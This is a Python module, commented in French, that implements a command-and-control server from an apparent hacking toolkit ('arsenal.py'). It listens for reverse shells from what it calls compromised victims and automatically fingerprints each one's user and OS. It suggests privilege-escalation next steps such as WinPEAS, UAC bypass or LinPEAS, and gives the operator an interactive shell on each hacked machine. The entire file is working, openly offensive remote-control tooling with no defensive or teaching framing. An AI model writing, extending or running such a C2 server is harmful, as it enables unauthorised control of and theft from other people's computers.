import asyncio
import os
import sys

# Dictionnaire pour stocker les victimes compromises
sessions = {}
session_counter = 1

async def auto_privesc(reader, writer, session_id):
    """Phase de reconnaissance furtive dès la connexion de la cible."""
    print(f"\n[\033[94m*\033[0m] [Session {session_id}] Lancement de l'Auto-Reconnaissance...")
    
    try:
        # 1. Qui sommes-nous ? (Windows & Linux comprennent 'whoami')
        writer.write(b"whoami\n")
        await writer.drain()
        user = (await reader.read(1024)).decode(errors='ignore').strip()
        
        # 2. Détection de l'OS (Approche furtive)
        writer.write(b"echo %OS% $OSTYPE\n") 
        await writer.drain()
        os_env = (await reader.read(1024)).decode(errors='ignore').strip()
        
        is_windows = "Windows" in os_env or "%OS%" not in os_env
        
        print(f"[\033[92m+\033[0m] [Session {session_id}] Identité confirmée : \033[1m{user}\033[0m")
        
        # 3. Évaluation des privilèges
        if is_windows:
            if "nt authority\\system" in user.lower() or "administrateur" in user.lower() or "administrator" in user.lower():
                print(f"[\033[92m+\033[0m] [Session {session_id}] BINGO ! Vous êtes déjà SYSTEM (Dieu sur la machine).")
            else:
                print(f"[\033[93m!\033[0m] [Session {session_id}] OS : Windows | Accès Standard.")
                print(f"    -> Prêt pour l'élévation. Préparez WinPEAS ou un module de contournement UAC.")
        else:
            if "root" in user.lower():
                 print(f"[\033[92m+\033[0m] [Session {session_id}] BINGO ! Vous êtes root.")
            else:
                 print(f"[\033[93m!\033[0m] [Session {session_id}] OS : Linux | Accès Standard.")
                 print(f"    -> Pensez à vérifier 'sudo -l' ou à lancer LinPEAS.")

        # On rafraîchit le prompt du C2 pour l'utilisateur
        print("C2> ", end="", flush=True)
        
    except Exception as e:
        print(f"[-] Erreur lors de la reconnaissance sur la session {session_id} : {e}")

async def handle_client(reader, writer):
    """Gère une nouvelle victime qui vient de se faire pirater."""
    global session_counter
    session_id = session_counter
    session_counter += 1
    
    addr = writer.get_extra_info('peername')
    print(f"\n[\033[92m+\033[0m] Nouvelle cible compromise depuis {addr[0]}:{addr[1]} (Attribution Session ID: {session_id})")
    
    # On ajoute la victime dans notre tableau de chasse
    sessions[session_id] = (reader, writer)
    
    # On lance l'auto-reconnaissance sans bloquer le reste du C2
    asyncio.create_task(auto_privesc(reader, writer, session_id))
    
    # Boucle de maintien en vie de la connexion
    try:
        while True:
            data = await reader.read(1024)
            if not data:
                break # La victime s'est déconnectée
    except Exception:
        pass
    finally:
        print(f"\n[-] Perte du signal avec la cible {session_id} ({addr[0]}).")
        if session_id in sessions:
            del sessions[session_id]
        print("C2> ", end="", flush=True)

async def c2_shell():
    """L'interface de commande locale pour le Hacker (Toi)."""
    await asyncio.sleep(0.5)
    print("\n[\033[94m*\033[0m] Console C2 active. Tapez 'help' pour la liste des ordres.")
    
    while True:
        # asyncio.to_thread empêche le input() de geler le serveur
        cmd = await asyncio.to_thread(input, "C2> ")
        cmd = cmd.strip()
        
        if not cmd: continue
        
        if cmd.lower() in ['exit', 'quit']:
            print("[*] Arrêt du serveur Command & Control...")
            os._exit(0)
            
        elif cmd.lower() == 'sessions':
            print("\n\033[1m--- Cibles Actives ---\033[0m")
            if not sessions:
                print("Aucune machine sous contrôle actuellement.")
            for sid, (r, w) in sessions.items():
                addr = w.get_extra_info('peername')
                print(f"  [ID: {sid}] -> {addr[0]}:{addr[1]}")
            print("----------------------\n")
            
        elif cmd.lower().startswith('interact'):
            parts = cmd.split()
            if len(parts) < 2:
                print("[-] Usage : interact <id_session>")
                continue
            try:
                sid = int(parts[1])
                if sid not in sessions:
                    print(f"[-] Session {sid} inexistante ou morte.")
                    continue
                
                print(f"[*] Entrée dans la machine cible {sid}. Tapez 'background' pour revenir au C2.")
                r, w = sessions[sid]
                
                # Boucle d'interaction avec la victime
                while True:
                    shell_cmd = await asyncio.to_thread(input, f"\033[91mVictime[{sid}]\033[0m> ")
                    if shell_cmd.lower() == 'background':
                        print("[*] Session mise en attente (elle reste connectée).")
                        break
                    
                    w.write((shell_cmd + '\n').encode())
                    await w.drain()
                    
                    try:
                        # On attend la réponse de la commande système
                        response = await asyncio.wait_for(r.read(8192), timeout=5.0)
                        print(response.decode(errors='ignore').strip())
                    except asyncio.TimeoutError:
                        print("[-] Délai d'attente dépassé (la commande tourne peut-être encore).")
                        
            except ValueError:
                print("[-] L'ID doit être un chiffre.")

        elif cmd.lower() == 'help':
            print("\n\033[1m--- Arsenal C2 ---\033[0m")
            print("  sessions         : Affiche toutes les machines piratées")
            print("  interact <id>    : Prend le contrôle terminal d'une victime")
            print("  background       : (Pendant l'interaction) Revient au C2")
            print("  exit             : Coupe tout et ferme le framework")
            print("------------------\n")
        else:
            print(f"[-] Commande C2 inconnue. Tapez 'help'.")

async def start_c2(port):
    """Démarre le socket serveur asynchrone."""
    print(f"[*] Démarrage du centre de commandement sur le port {port}...")
    server = await asyncio.start_server(handle_client, '0.0.0.0', port)
    
    addr = server.sockets[0].getsockname()
    print(f"[\033[92m+\033[0m] C2 en écoute silencieuse sur {addr[0]}:{addr[1]}")

    # On fait tourner le serveur réseau ET notre interface de commande en même temps
    await asyncio.gather(
        server.serve_forever(),
        c2_shell()
    )

def run_c2(args):
    """Wrapper pour ton fichier arsenal.py"""
    try:
        asyncio.run(start_c2(args.port))
    except KeyboardInterrupt:
        pass